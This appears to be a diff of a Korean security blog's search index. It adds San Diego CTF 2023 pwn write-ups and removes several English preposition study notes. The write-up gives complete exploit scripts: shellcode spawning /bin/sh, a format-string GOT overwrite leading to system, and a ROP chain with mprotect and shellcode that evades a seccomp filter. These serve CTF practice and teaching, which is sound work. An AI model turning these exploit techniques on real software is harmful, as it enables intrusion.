@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>San Diego CTF 2023 Write ups</title>
+      <link href="/230515-sandiegoctf2023-PWN/"/>
+      <url>/230515-sandiegoctf2023-PWN/</url>
+      
+        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1910">https://ctftime.org/event/1910</a></li></ul><p>1주일 뒤에나 작성하는 Write ups.. 한 문제 빼고 다 풀었는데 못 푼 문제는 너무 극악의 fsb였다. 나머지 문제는 쉽게 풀이했던 걸로 기억. </p><h2 id="Turtle-Shell"><a href="#Turtle-Shell" class="headerlink" title="Turtle Shell"></a>Turtle Shell</h2><blockquote><p>A turtle without it’s shell is a sad sight to see<br>Connect via: <code>nc turtle.sdc.tf 1337</code><br>Dockerfile turtle-shell</p></blockquote><ul><li>[111 solves &#x2F; 100 points]</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./turtle-shell&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;turtle.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./turtle-shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="money-printer"><a href="#money-printer" class="headerlink" title="money-printer"></a>money-printer</h2><blockquote><p>The first step to getting rich is printing money<br>Connect via: <code>nc money.sdc.tf 1337</code><br>Dockerfile money-printer</p></blockquote><ul><li>[140 solves &#x2F; 150 points]</li></ul><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./money-printerp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;money.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./money-printerp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. exit@got -&gt; main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;exit&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>] &#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#51</span></span><br><span class="line"><span class="comment"># - 0x21c87</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%57$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x21c87</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">4</span>] &#125;,</span><br><span class="line">        write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"><span class="comment"># sdctf&#123;d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary                        : ✓ (value: 0xedabb8ef1d292700)</span></span><br><span class="line"><span class="comment"># NX                            : ✓</span></span><br><span class="line"><span class="comment"># PIE                           : ✘</span></span><br><span class="line"><span class="comment"># Fortify                       : ✘</span></span><br><span class="line"><span class="comment"># RelRO                         : Partial</span></span><br></pre></td></tr></table></figure><h2 id="tROPic-thunder"><a href="#tROPic-thunder" class="headerlink" title="tROPic-thunder"></a>tROPic-thunder</h2><blockquote><p>I hope this isn’t your first rodeo<br>Connect via: <code>nc thunder.sdc.tf 1337</code><br>Dockerfile tROPic-thunder</p></blockquote><ul><li>[69 solves &#x2F; 250 points]</li></ul><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>seccomp이 걸려있지만 평이하게 걸려있다. <code>execve</code>를 실행시키자.</p><p><code>mprotect</code>가 있는 한, 이것을 실행시켜 특정 공간에 실행 권한을 주고 거기에 쉘 코드를 넣어서 그 곳으로 점프하는 생각을 하자.</p><h3 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./tROPic-thunder&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;thunder.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tROPic-thunder&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x41003c</span></span><br><span class="line">pop_rax = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a6</span></span><br><span class="line">pop_rsi = <span class="number">0x40165c</span></span><br><span class="line">pop_rdx = <span class="number">0x4589f5</span></span><br><span class="line"></span><br><span class="line">bss = e.bss() + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># mprotect(bss, 0x1000, 7)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rax)</span></span><br><span class="line"><span class="comment"># payload += p64(10)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"><span class="comment"># read(0, bss, 0x1000)</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x41414141) # jmp!</span></span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>) <span class="comment"># jmp!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, read, write</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> San Diego </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> fsb </tag>
+            
+            <tag> seccomp </tag>
+            
+            <tag> shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Wani CTF 2023 - Time Table (type confusion)</title>
       <link href="/230509-wanictf2023-8.time-table/"/>
       <url>/230509-wanictf2023-8.time-table/</url>
@@ -477,60 +508,6 @@
     
     
     <entry>
-      <title>English - to (Preposition)</title>
-      <link href="/230428-english-preposition-to/"/>
-      <url>/230428-english-preposition-to/</url>
-      
-        <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="to-as-a-preposition"><a href="#to-as-a-preposition" class="headerlink" title="to as a preposition"></a><code>to</code> as a preposition</h2><ol><li>Infinitive<br>:: used with an infinitive to express use or purpose<ul><li>This tool is used to make holes in leather.</li><li>To make this cake, you’ll need two eggs, 175 grams of sugar, and 175 grams of flour.</li><li>He works to get paid, not because he enjoys it.</li></ul></li></ol><p>:: used with an infinitive after ‘there is’ or ‘there are’ and a noun<br>    - There’s an awful lot of work to be done.</p><ol start="2"><li><p>Showing direction<br>:: in the direction of</p><ul><li>You can walk from here to the school in under ten minutes.</li><li>I asked Kirsten and Kai to dinner (&#x3D; invited them to come and eat dinner with me) next week.</li><li>She walked over to the window.</li><li>He went up to a complete stranger and started talking.<ul><li>go up, walk over &#x3D; approach</li></ul></li><li>UK You’ve got your sweater on back to front (&#x3D; with the back of the sweater on the chest).</li></ul></li><li><p>Receiving<br>:: used for showing who receives something or who experiences an action</p><ul><li>I told that to Alex and he just laughed.</li><li>Who’s the letter addressed to?</li></ul></li></ol><p>:: With many verbs that have two objects, ‘to’ can be used before the indirect object<br>    - Give me that gun.&#x2F;Give that gun to me.<br>        - me: indirect object</p><ol start="4"><li><p>Until<br>:: used when saying the time, to mean before the stated hour</p><ul><li>It’s twenty to six.</li></ul></li><li><p>Connection<br>:: in connection with</p><ul><li>What was their response to your query?</li><li>She was so mean to me.</li><li>There’s a funny side to everything.</li></ul></li><li><p>Considered by</p><ul><li>I realize it may sound strange to you.</li><li>I mean, £50 is nothing to him (&#x3D; he would not consider it a large amount).</li><li>(informal) “I hear you’ve been going out with Ella.” “Yeah, so? What’s it to you?” (&#x3D; It should not interest you, and you have no right to ask about it.)</li></ul></li><li><p>Serving</p><ul><li>As a personal trainer to the rich and famous, he earns over a million dollars a year.</li></ul></li><li><p>Belonging<br>:: matching or belonging to</p><ul><li>My dad gave me the keys to his car.</li><li>I’ve lost the trousers to this jacket.</li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>English - from (Preposition)</title>
-      <link href="/230428-english-preposition-from/"/>
-      <url>/230428-english-preposition-from/</url>
-      
-        <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="from-as-a-preposition"><a href="#from-as-a-preposition" class="headerlink" title="from as a preposition"></a><code>from</code> as a preposition</h2><ol><li><p>Time<br>:: used to show the time when something starts or the time when it was made or first existed</p><ul><li>Drinks will be served from seven o’clock.</li><li>The price of petrol will rise by 5p a gallon from tomorrow.</li><li>Most of the tapestries in this room date from the 17th century.</li><li>I’ll be at home from four o’clock onwards.</li></ul></li><li><p>Distance<br>:: used to show the distance between two places</p><ul><li>It’s about two kilometres from the airport to your hotel.</li><li>We’re about a mile from home.</li></ul></li><li><p>Origin<br>:: used to show the origin of something or someone</p><ul><li>I wonder who this card is from.</li><li>What sort of reaction did you get from him?</li></ul></li><li><p>Material<br>:: used to show the material of which something is made</p><ul><li>The desk is made from pine.</li><li>Meringues are made from sugar and egg whites.</li></ul></li><li><p>Change<br>:: used to show a change in the state of someone or something</p><ul><li>Things went from bad to worse.</li><li>The story was translated from Turkish to English.</li><li>Since the success of her first play, she has gone from strength to strength (&#x3D; her success has continued to increase).</li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title></title>
       <link href="/230427-angstromctf2023-queue/"/>
       <url>/230427-angstromctf2023-queue/</url>
@@ -733,119 +710,11 @@
     
     
     <entry>
-      <title>English - for (Preposition)</title>
-      <link href="/230426-english-preposition-for/"/>
-      <url>/230426-english-preposition-for/</url>
-      
-        <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="for-as-a-preposition"><a href="#for-as-a-preposition" class="headerlink" title="for as a preposition"></a><code>for</code> as a preposition</h2><ol><li><p>Intended for<br>:: intended to be given to</p><ul><li>There’s a phone message for you.</li><li>There’s a prize for the fastest three runners in each category.</li></ul></li><li><p>Purpose<br>:: having the purpose of</p><ul><li>There’s a sign there saying “boats for hire”.</li><li>They’ve invited us for dinner on Saturday.</li><li>Which vitamins should you take for (&#x3D; in order to cure) skin problems?</li><li>Put those clothes in a pile for washing (&#x3D; so that they can be washed).</li></ul></li><li><p>Because of<br>:: because of or as a result of something</p><ul><li>I’m feeling all the better for my holiday.</li><li>“How are you?” “Fine, and all the better for seeing you!”</li><li>I couldn’t see for the tears in my eyes.</li><li>The things you do for love!</li><li>She couldn’t talk for coughing (&#x3D; she was coughing too much to talk).</li><li>I didn’t say anything for fear of (&#x3D; because I was frightened of) offending him.</li></ul></li><li><p>Time&#x2F;Distance<br>:: used to show an amount of time or distance</p><ul><li>We walked for miles.</li><li>I haven’t played tennis for years.</li></ul></li><li><p>Occasion 횟수<br>:: on the occasion of or at the time of</p><ul><li>I’d like an appointment with the doctor for some time this week.</li><li>I’ve booked a table at the restaurant for nine o’clock.</li></ul></li><li><p>Comparing<br>:: used for comparing one thing with others of the same type</p><ul><li>She’s very mature for her age.</li><li>For every two people in favour of the law there are three against.</li><li>It was a difficult decision, especially for a child.</li><li>For a man of his wealth he’s not exactly generous.</li></ul></li><li><p>Support<br>:: in support of or in agreement with</p><ul><li>I voted for the Greens at the last election.</li><li>Those voting for the motion, 96, and those voting against, 54.</li><li>So let’s hear some applause for these talented young performers.</li><li>Who’s for (&#x3D; who wants to play) tennis?</li></ul></li><li><p>Help<br>:: in order to help someone</p><ul><li>Let me carry those bags for you.</li><li>Hello, what can I do for you?</li><li>My sister will take care of the dog for us while we’re away.</li></ul></li><li><p>Payment<br>:: (getting) in exchange</p><ul><li>I’ve sponsored her £1 for every mile that she runs.</li><li>The mechanic said he’d repair my car for £300.</li></ul></li><li><p>Represending<br>:: being employed by or representing a company, country, etc.</p><ul><li>She works for a charity.</li><li>He swam for the United States in the 2000 Olympics.</li></ul></li><li><p>Towards<br>:: towards; in the direction of</p><ul><li>They looked as if they were heading for the train station.</li><li>This time tomorrow we’ll be setting off for the States.</li><li>It says this train is for (&#x3D; going to stop at) Birmingham and Coventry only.</li></ul></li><li><p>Meaning<br>:: showing meaning</p><ul><li>What’s the Spanish word for “vegetarian”?</li><li>What does the “M.J.” stand for? Maria José?<ul><li>stand for: 의미하다</li></ul></li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>English - by (Preposition)</title>
-      <link href="/230424-english-preposition-by/"/>
-      <url>/230424-english-preposition-by/</url>
-      
-        <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="by-as-a-preposition"><a href="#by-as-a-preposition" class="headerlink" title="by as a preposition"></a><code>by</code> as a preposition</h2><ol><li><p>Agent<br> :: used to show the person or thing that does something</p><ul><li>The motorcycle was driven by a tiny bald man.</li><li>The book was translated by a well-known author.</li><li>I felt frightened by the anger in his voice.</li></ul></li><li><p>Position<br>:: near or at the side of</p><ul><li>A small child stood sullenly by her side. (sullenly 못마땅하게)</li><li>He wanted to keep her close by him always.</li><li>The policewoman walked by (&#x3D; past) them without saying a word.</li></ul></li><li><p>Not later than<br>:: not later than; at or before</p><ul><li>She had promised to be back by five o’clock. <ul><li>by five o’clock &#x3D; at five o’clock &#x3D; before five o’clock, 다만 after은 x</li></ul></li><li>The application must be in by the 31st to be accepted.</li><li>By the time I got to the station the train had already gone.</li></ul></li><li><p>Measurement<br>:: used to show measurements or amounts</p><ul><li>Our office floor space measured twelve metres by ten (&#x3D; was twelve metres in one direction and ten in the other).<ul><li>12 x 10</li></ul></li><li>Their wages were increased by 15 percent.</li><li>Freelance workers are paid by the hour (&#x3D; for every hour they work).</li><li>These phones have sold by the thousand (&#x3D; several thousand have been sold).</li></ul></li></ol><h2 id="by-as-a-adverb"><a href="#by-as-a-adverb" class="headerlink" title="by as a adverb"></a><code>by</code> as a adverb</h2><ol><li><p>by nature, profession, trade, etc.</p><ul><li>She is, by nature, a sunny, positive kind of person.</li><li>He’s a plumber by trade.</li><li>She was, by profession, a lawyer.</li></ul></li><li><p>at the side of or (in distance or time) past</p><ul><li>The policewoman walked by without saying a word.</li><li>Why don’t you call in for a cup of coffee next time you’re passing by?</li><li>The years flew by.</li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>English - at (Preposition)</title>
       <link href="/230420--english-preposition-at/"/>
       <url>/230420--english-preposition-at/</url>
       
         <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="at-as-a-preposition"><a href="#at-as-a-preposition" class="headerlink" title="at as a preposition"></a><code>at</code> as a preposition</h2><ol><li><p>Place<br>:: used to show an exact position or particular place</p><ul><li>That bit at the beginning of the film was brilliant.</li><li>The dog came and lay down at (&#x3D; next to) my feet. </li><li>There’s someone at the door (&#x3D; someone is outside and wants to come in). </li><li>I called her but she was at lunch (&#x3D; away, eating her lunch).</li></ul></li><li><p>Time<br>:: used to show an exact or a particular time</p><ul><li>at half past two</li><li>Are you free at lunchtime? </li><li>In theory, women can still have children at the age of 50. </li><li>The bells ring at regular intervals through the day. </li><li>At no time&#x2F;point did the company do anything illegal. </li><li>I’m busy at the moment (&#x3D; now) - can you call back later?</li><li>It’s a shame I wasn’t here to meet you - I was overseas at the time (&#x3D; then).</li></ul></li><li><p>Direction<br>:: in the direction of</p><ul><li>She smiled at me.  </li><li>They waved at us as we drove by. </li><li>“Look at me! Look at me!” called the little girl.</li><li>He’s always shouting at the children.</li></ul></li><li><p>Cause<br>:: used to show the cause of something, especially a feeling</p><ul><li>We were surprised at the news.  </li><li>I was quite excited at the prospect.  </li><li>Why does no one ever laugh at my jokes?</li></ul></li><li><p>Activity<br>:: used to show the activity in which someone’s ability is being judged</p><ul><li>I was never very good at sports. </li><li>He’s very good at getting on with people. </li><li>She’s hopeless at organizing things.</li></ul></li><li><p>Email address<br>:: @</p></li><li><p>Amount<br>:: used to show a price, temperature, rate, speed, etc.</p><ul><li>I’m not going to buy those shoes at $150! </li><li>Inflation is running at 5 percent.</li><li>He was driving at 120 mph when the police spotted him.</li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>English - on (Preposition)</title>
-      <link href="/230419-english-preposition-on/"/>
-      <url>/230419-english-preposition-on/</url>
-      
-        <content type="html"><![CDATA[<p><del><code>on</code> is more difficult than <code>in</code> for me.</del></p><ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="on-as-a-preposition"><a href="#on-as-a-preposition" class="headerlink" title="on as a preposition"></a><code>on</code> as a preposition</h2><ol><li><p>Above<br>:: We use it to show that something is in a position above something else and touching it, or that something is moving into such a position.</p><ul><li>Ow, you’re standing on my foot!</li><li>Your suitcase is on top of the wardrobe.</li><li>Don’t put your elbows on the table.</li><li>I got on my bike and left.</li></ul></li><li><p>Connected<br>:: covering the surface of, being held by, or connected to something</p><ul><li>There’s blood on your shirt.</li><li>Which finger do you wear your ring on?</li><li>Can you stand on your head? (&#x3D;handstand)</li><li>Dogs should be kept on their leashes at all times.</li><li>(UK) We’ve just moved house and we’re not on the phone (&#x3D; not connected to the phone service) yet.</li></ul></li><li><p>Travel<br>:: We use it to show some methods of travelling.</p><ul><li>on + (big platform, sit, stand …)</li><li>I love travelling on trains.</li><li>She’s coming in on the 5.30 bus.</li><li>We went to France on the ferry.</li><li>It’d be quicker to get there on foot. (&#x3D; walking)</li><li>The crowd were surrounded by police on horseback.</li></ul></li><li><p>Process<br>:: We use it to show that a condition or process is being experienced.</p><ul><li>He accidentally set his bed on fire.</li><li>I often get carsick when I’m on a long journey.</li><li>Crime is on the increase (&#x3D; is increasing) again.</li><li>(UK) Their flights to Paris are on special offer at the moment.</li><li>(UK) I’ll be away on a training course next week.</li></ul></li><li><p>Money<br>:: We use it to show something for which a payment is made.</p><ul><li>He spent €180 on a hat.</li><li>I’ve wasted a lot of money on this car.</li><li>We made a big profit on that deal.</li><li>How much interest are you paying on the loan?</li></ul></li><li><p>Next to<br>:: next to or along the side of</p><ul><li>It’s a small town on the Mississippi River.</li><li>Our house was on Sturton Street.</li><li>Strasbourg is on the border of France and Germany.</li><li>Negotiations between the two countries are <U>on the brink of</U> collapse.</li></ul></li></ol><h2 id="on-as-an-adverb"><a href="#on-as-an-adverb" class="headerlink" title="on as an adverb"></a><code>on</code> as an 